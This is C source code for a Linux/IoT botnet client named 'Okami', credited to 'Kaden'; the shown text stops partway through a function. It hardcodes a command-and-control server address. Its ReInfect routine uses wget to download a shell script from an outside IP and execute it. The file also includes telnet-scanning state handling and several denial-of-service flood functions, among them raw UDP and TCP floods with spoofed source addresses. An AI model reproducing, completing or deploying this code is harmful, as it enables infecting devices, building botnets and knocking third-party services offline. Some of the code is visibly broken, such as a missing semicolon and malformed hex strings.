// a simply epic client
// created by Kaden
// Updated often
// If you want to clean the device on infection, scroll down to line 1115, otherwise its !* CLEAN
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>  
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>                                                      
#include <strings.h>                                                      
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/time.h>

#define PHI 0x9e3779b9
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define SOCKBUF_SIZE 1024
#define STD2_SIZE 69
#define kaden_std 1460



unsigned char *commServer[] = { "209.97.183.24:812" }; // Make sure to fill this out, and everything in the ReInfect

void ReInfect() { // We're gonna run this after we clean the device
	system("linuxshell && system && enable && sh && shell && bah;"); // Enabling shell for our Telnet friends; maybe some BusyBox SSH? Idk
	system("cd /tmp;");
	system("wget http://46.36.37.3/Okami.sh; chmod +x Okami.sh; sh Okami.sh");
	system("rm -rf Okami.sh");
}

char *getBuild() { 
#if defined(__x86_64__) || defined(_M_X64)
	return "x86_64";
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86_)
	return "x86_32";
#elif defined(__ARM_ARCH_2__)
	return "ARM2";
#elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
	return "ARM3";
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
	return "ARM4T";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
	return "ARM5"
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
	return "ARM6T2";
#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
	return "ARM6";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
	return "ARM7";
#elif defined(__aarch64__)
	return "ARM64";
#elif defined(mips) || defined(__mips__) || defined(__mips)
	return "MIPS";
#elif defined(__sh__)
	return "SUPERH";
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
	return "POWERPC";
#elif defined(__sparc__) || defined(__sparc)
	return "SPARC";
#elif defined(__m68k__)
	return "M68K";
#else
	return "UNKNOWN";
#endif
}
const char *UsrAgents[] = {  // Okami does have HTTP :)
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
};

struct telstate_t {
        int fd;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd; 	
        unsigned char passwordInd; 	
        unsigned char tempDirInd; 	
        unsigned int tTimeout;		
        unsigned short bufUsed;
        char *sockbuf;
};
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};

					
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
int contains_string(char* buffer, char** strings) {
        int num_strings = 0, i = 0;
        for(num_strings = 0; strings[++num_strings] != 0; );
        for(i = 0; i < num_strings; i++) {
                if(strcasestr(buffer, strings[i])) {
                        return 1;
                }
        }
        return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size) {       
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;
        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);
        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
        return 0;
        return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings) {
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
        if(buffer[0] == 0xFF) {
                negotiate(fd, buffer, 3);
        }

        if(contains_string(buffer, strings)) {
                return 1;
        }

        return 0;
}
const char* get_telstate_host(struct telstate_t* telstate) { 
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t* telstate, int new_state) {
        if(new_state == 0) {
                close(telstate->fd);
        }
        telstate->tTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t* telstate) { 
        advance_telstate(telstate, 0);
        telstate->complete = 1;
}
void trim(char *str) {
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c) {
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
        register int pc = 0, padchar = ' ';
        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }
        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;
        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }
        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';
        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }
        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int zprintf(const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...) {
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("%s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern) {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}
int getHost(unsigned char *toGet, struct in_addr *i) {
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}
void makeRandomStr(unsigned char *buf, int length) {
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize) {
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10) {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1) {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }
        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);
        return 1;
}
int listFork() {
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
int negotiate(int sock, unsigned char *buf, int len) {
        unsigned char c;
        switch (buf[1]) {
        case CMD_IAC: return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;
        default:
                break;
        }

        return 0;
}
int matchPrompt(char *bufStr) {
        char *prompts = ":>%$#\0";
        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++) {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }
        return 0;
}

in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count) {
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
        struct tcp_pseudo {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int sclose(int fd) {
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
void SendSTDHEX(unsigned char *ip, int port, int secs) 
{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while(1)
	{
		char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
		if (a >= 50)
		{
			send(std_hex, hexstring, kaden_std, 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}
void SendSTD(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin; 
struct hostent *hp;     
hp = gethostbyname(ip); 
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"WYHRzp68omQcEaoW","xYjPH0XYQyNnZDd4","KaDeNTheBoTNETHeGOD","Iger8HgN8DU5Cv2m","E0H2DeSLyzQ93Bh2","zhYf0MvzTJ1S0ivq","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","UQX1v4chpBay13JL","a7pInUoLgx1CPFlGB5JF","X1k5ICjenaWIZ4Gf","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","1cvFW1QcSuZ627CQ","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","UkXK4CDG3OBO1vVufiKv","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","SllNepLi918c9I8J","Kaden1337",};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}
void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;	
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit) {
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd) { return; }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { return; }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        if(!strcmp(flags, "ALL")) {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, "-");
                while(pch) {
                        if(!strcmp(pch,         "SYN")) { tcph->syn = 1;
                        } else if(!strcmp(pch,  "RST")) { tcph->rst = 1;
                        } else if(!strcmp(pch,  "FIN")) { tcph->fin = 1;
                        } else if(!strcmp(pch,  "ACK")) { tcph->ack = 1;
                        } else if(!strcmp(pch,  "PSH")) { tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1) {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                if(i == pollRegister) {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
int socket_connect(char *host, in_port_t port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
